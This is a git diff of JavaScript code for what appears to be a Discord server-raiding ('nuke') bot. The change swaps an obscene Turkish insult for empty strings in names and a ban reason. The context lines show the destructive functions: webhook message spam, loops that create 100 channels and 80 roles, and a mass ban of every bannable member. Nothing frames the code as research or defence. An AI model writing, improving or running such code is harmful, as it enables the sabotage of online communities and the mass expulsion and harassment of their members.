@@ -20,7 +20,7 @@ let nukeActive = false;
 async function megaWebhookSpam(channel) {
     try {
         const webhook = await channel.createWebhook({
-            name: 'laxecan sikti atti',
+            name: '',
             avatar: 'https://i.pinimg.com/736x/ec/10/df/ec10df93154cc37dbc24eb8c71fc1ebe.jpg'
         });
 
@@ -30,7 +30,7 @@ async function megaWebhookSpam(channel) {
             promises.push(
                 webhook.send({
                     content: config.spamMessage,
-                    username: 'laxecan sikti atti',
+                    username: '',
                     avatarURL: 'https://i.pinimg.com/736x/ec/10/df/ec10df93154cc37dbc24eb8c71fc1ebe.jpg'
                 }).catch(() => {})
             );
@@ -101,7 +101,7 @@ async function megaInfiniteChannels(guild) {
             for (let i = 0; i < 100; i++) {
                 promises.push(
                     guild.channels.create({
-                        name: 'laxecan-sikti-atti',
+                        name: '',
                         type: 0,
                         permissionOverwrites: [{
                             id: guild.id,
@@ -147,7 +147,7 @@ async function megaInfiniteRoles(guild) {
             for (let i = 0; i < 80; i++) {
                 promises.push(
                     guild.roles.create({
-                        name: 'laxecan sikti atti',
+                        name: '',
                         color: 'Red',
                         permissions: []
                     }).then(role => {
@@ -195,7 +195,7 @@ async function instantMassBan(guild) {
             if (!member.bannable) return;
             
             promises.push(
-                member.ban({ reason: 'laxecan sikti atti' })
+                member.ban({ reason: '' })
                     .then(() => {
                         banned++;
                         console.log(`[BAN] ✅ ${member.user.tag}`);
